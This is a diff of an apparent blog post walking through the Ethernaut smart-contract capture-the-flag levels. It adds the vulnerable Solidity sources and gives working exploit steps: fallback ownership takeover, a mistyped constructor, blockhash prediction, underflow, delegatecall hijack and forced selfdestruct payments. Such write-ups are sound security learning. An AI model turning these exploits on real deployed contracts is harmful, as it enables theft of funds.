@@ -9,12 +9,49 @@ While this is not intended as a comprehensive walkthrough, here are the things t
 - In MetaMask, you will need to set up a new wallet address, and put some money in it. You can do this through a "faucet", which just gives you some (Sepolia-only) ETH. I got mine from [here](https://cloud.google.com/application/web3/faucet/ethereum/sepolia).
 - A lot of the learning here, at least in the first handful of levels, is just figuring out how to interface with everything, often via the web3js console on the Ethernaut page, but also "externally" via things like RemixIDE.
 
-## Level 1: Hello Ethernaut
+## Level 0: Hello Ethernaut
 This is just a tutorial level, which gets you to set up MetaMask, interact with basic functionality via the console, etc. At the end of the instructions you're asked to call the `.info()` method, which sends you on a trail of method calls which eventually gets you to call the `.authenticate()` method with the embedded password.
 
 Once you have met the requirements the pass the level, you need to press "Submit Instance" on the ethernaut page to go to the next level.
 
-## Level 2: Fallback
+## Level 1: Fallback
+```
+contract Fallback {
+    mapping(address => uint256) public contributions;
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+        contributions[msg.sender] = 1000 * (1 ether);
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "caller is not the owner");
+        _;
+    }
+
+    function contribute() public payable {
+        require(msg.value < 0.001 ether);
+        contributions[msg.sender] += msg.value;
+        if (contributions[msg.sender] > contributions[owner]) {
+            owner = msg.sender;
+        }
+    }
+
+    function getContribution() public view returns (uint256) {
+        return contributions[msg.sender];
+    }
+
+    function withdraw() public onlyOwner {
+        payable(owner).transfer(address(this).balance);
+    }
+
+    receive() external payable {
+        require(msg.value > 0 && contributions[msg.sender] > 0);
+        owner = msg.sender;
+    }
+}
+```
 At this point we see our first solidity code and start sending our first "real" transactions. We win the level by taking ownership of the contract and withdrawing all of the contract's balance.
 
 The first thing I did here was read through the solidity code. It didn't take long to find the route to taking ownership.
@@ -29,7 +66,7 @@ We can, however, call `await contract.contributions(player)`, which gives us a p
 ```
 I haven't yet dealt with numbers too big for JavaScript, but I'm guessing there's a point at which `toNumber()` is no longer viable, and I'm hoping that `toString()` is able to represent those very large numbers in string form.
 
-### A note on sending ether with a method call
+### A note on sending balance with a method call
 The next challenge in the interface for me was actually sending ether with a method call. The approaches we have used so far to call these methods have not involved sending any ether, or at least not specifying how much ether we send. This turned out to be pretty simple, but very poorly documented - I think the advice in the CTF level wanted us to google the phrase "How to send ether when interacting with an ABI" perhaps. This still pointed me to stackexchange answers, which is not documentation.
 
 In the end, I was able to contribute 0.0005 ether with the following:
@@ -46,12 +83,50 @@ So far we have just been playing with the interface, but the way to solve this l
 
 But the next thing is again an interface question: how do I send some ether to this contract without specifying a method? Turns out this was pretty simple too:
 ```
-contract.send(web3.utils.toWei("0.0005", "ether")); 
+contract.send(web3.utils.toWei("0.0005", "ether"));
 ```
 
 After this has gone through, we can see that we are now the owner by querying `await contract.owner()`. We have claimed ownership of the contract, we just need to reduce its balance to 0. This can be achieved with `contract.withdraw()` now that we are the owner. And that completes this level.
 
-# Level 3: Fal1out
+# Level 2: Fal1out
+```
+import "openzeppelin-contracts-06/math/SafeMath.sol";
+
+contract Fallout {
+    using SafeMath for uint256;
+
+    mapping(address => uint256) allocations;
+    address payable public owner;
+
+    /* constructor */
+    function Fal1out() public payable {
+        owner = msg.sender;
+        allocations[owner] = msg.value;
+    }
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "caller is not the owner");
+        _;
+    }
+
+    function allocate() public payable {
+        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
+    }
+
+    function sendAllocation(address payable allocator) public {
+        require(allocations[allocator] > 0);
+        allocator.transfer(allocations[allocator]);
+    }
+
+    function collectAllocations() public onlyOwner {
+        msg.sender.transfer(address(this).balance);
+    }
+
+    function allocatorBalance(address allocator) public view returns (uint256) {
+        return allocations[allocator];
+    }
+}
+```
 This is a funny one. It's an error that seems too obvious to be real. There's just a typo in the name of the constructor of this contract, which means the constructor was never called. It also means we are able to call the "constructor" method any time we want, which will make us the owner.
 ```
 contract.Fal1out();
@@ -60,7 +135,38 @@ await contract.owner();
 
 I waited a minute for the original transaction to go through. I could see this had happened when the owner changed, although I'm sure there would be another way in this interface to see when a transaction has been confirmed. This was all that was needed to complete this level.
 
-# Level 4: Coin Flip
+# Level 3: Coin Flip
+```
+contract CoinFlip {
+    uint256 public consecutiveWins;
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor() {
+        consecutiveWins = 0;
+    }
+
+    function flip(bool _guess) public returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+
+        if (lastHash == blockValue) {
+            revert();
+        }
+
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        if (side == _guess) {
+            consecutiveWins++;
+            return true;
+        } else {
+            consecutiveWins = 0;
+            return false;
+        }
+    }
+}
+```
 Now we are given a contract intended to make you guess the outcome a 50/50 event, and get it right 10 times in a row. You can make a guess with `contract.flip(bool_guess)`, and you can see the number you have guessed correctly so far with `(await contract.consecutiveWins()).toNumber()`.
 
 From inspecting the contract, we can see that they are using the hash of the current (unconfirmed) to determine the coin flip's result. At first it looked like a parity check, but I think they are checking if the hash is greater or less than the large value stored in `FACTOR`, via integer division. I am assuming that `FACTOR` is half of the max value of a hash. It doesn't actually matter the intention, what matters is that we can do the same computation to predict what the outcome will be.
@@ -74,15 +180,14 @@ I wrote up the following contract:
 // SPDX-License-Identifier: GPL-3.0
 pragma solidity >=0.7.0 <0.9.0;
 
-contract Level4 {
+contract CrystalBall {
     uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
-    address private flipAddress = [ethernaut's contract address here];
 
-    function makeGuess() external {
+    function makeGuess(address coinFlipAddress) external {
         uint256 blockValue = uint256(blockhash(block.number - 1));
         uint256 coinFlip = blockValue / FACTOR;
         bool side = coinFlip == 1 ? true : false;
-        CoinFlip(flipAddress).flip(side);
+        CoinFlip(coinFlipAddress).flip(side);
     }
 
 }
@@ -106,7 +211,7 @@ Now I can compile and deploy this contract. There is a "Deploy" tab on the left 
 
 > A lesson from this level: "random" is very difficult on most blockchains.
 
-However, while pressing the button in Remix worked for me, I also wanted to know how to do this from the Ethernaut console. It turns out this is a bit tricky if you use `web3js` `Contract`s, but I'll show you the first way I got this working. First, I had to get the ABI and deployed address of my new `CoinFlipper` contract from Remix, which I used in the following on the Ethernaut console:
+However, while pressing the button in Remix worked for me, I also wanted to know how to do this from the Ethernaut console. It turns out this is a bit tricky if you use web3js `Contract`s, but I'll show you the first way I got this working. First, I had to get the ABI and deployed address of my new `CoinFlipper` contract from Remix, which I used in the following on the Ethernaut console:
 ```
 var flipperABI = [paste ABI here];
 var flipperAddress = "[paste address here]";
@@ -119,9 +224,9 @@ await flipper.methods.makeGuess.call().send();
 ```
 This is not quite as nice as the TruffleContract interface we have from Ethernaut's provided `contract`, but it's good enough for now.
 
-We just need to make 10 correct guesses, either from the Remix interface or from the Ethernaut console, and then we have completed the level.
+We just need to make 10 correct guesses, either from the Remix interface or from the Ethernaut console, and then we have completed the level. Depending on how fast the network is mining new blocks, this might take a while though.
 
-# Level 5: Telephone
+# Level 4: Telephone
 Looking at the code, this is very similar to the previous level, except that all we have to do is make a call via a deployed contract, without needing to calculate any parameters. I quickly built the following contract, using a similar method as in Level 4:
 ```
 // SPDX-License-Identifier: GPL-3.0
@@ -146,7 +251,7 @@ It was a simple call to this deployed contract's `makeCall()` function that gave
 > A lesson from this level: don't mix up `msg.sender` and `tx.origin`.
 
 
-# Level 6: Token
+# Level 5: Token
 A quick glance at the code doesn't show anything super out-of-place, but it was pretty simple to find the issue: integer underflow. And of course, you can see that the have specified Solidity version 0.6.0, as newer versions of the compiler take care of this sort of thing, afaik.
 
 The comparison in `require(balances[msg.sender] - _value >= 0);` will always pass, as `_value` is unsigned, as is everything in `balances`. My first thought was just to send 30 tokens to myself, but this wouldn't work; it would subtract 30 tokens from my balance, resulting in me having a huge number of tokens (2^256-10, give or take off-by-one), but then that number would "increase" again by 30, causing it to *overflow* back to the original 20. The first thing I did was to deploy a contract to send some tokens to myself, but then I realised I didn't even need to do that. I just sent 30 tokens from myself to the address of one of my previously-deployed contracts.
@@ -157,7 +262,7 @@ contract.transfer("[address of deployed contract]", 30);
 
 Calling the above completed the level for me.
 
-# Level 7: Delegation
+# Level 6: Delegation
 First glance of this contract shows me `delegatecall`, which is super interesting. Since you can't update contracts once they are deployed, it's common for contracts to simply be shells that point to implementations elsewhere, and `delegatecall` allows for method calls to be forwarded from contract A to contract B, such that contract B's code executes *on contract A's memory*. That last part is important.
 
 So, if we can get the `Delegation` contract to make a `delegatecall` to the `Delegate` contract's `pwn` function, then it will set `owner` to us, but that `owner` will be pointing back to the memory of `Delegation`, et voila, we will be the new owners.
@@ -174,7 +279,7 @@ sendTransaction({to:contract.address, from:player, data:"dd365b8b"});
 ```
 It seems that web3js etc took care of all the other details, such as gas price, gas allocation, etc. I'm glad I didn't need to dive into all of those details myself.
 
-# Level 8: Force
+# Level 7: Force
 This is another strange one. We are faced with a contract that has no payable methods and no fallbacks defined. It turns out some contracts really don't want to receive any payments, but there is a tricky way to force a payment on somebody: a contract can self-destruct, and when this happens it sends its entire balance to an address. That address is forced to receive the balance.
 
 It's a bit weird that `selfdestruct()` exists - it looks like there's some interesting history behind it. Nevertheless, it does exist and it's a way to force payment to an address that doesn't have payment fallbacks. I built the following contract that can receive payment and immediately self-destruct, sending its balance to a supplied address.
@@ -195,7 +300,7 @@ con.methods.boom(contract.address).send({value:web3.utils.toWei("0.0001", "ether
 ```
 This completed the level.
 
-# Level 9: Vault
+# Level 8: Vault
 
 Here, we can unlock the vault if we know the password. The `password` field is private, but of course everything on a blockchain is public, so of course that's going to be stored somewhere.
 
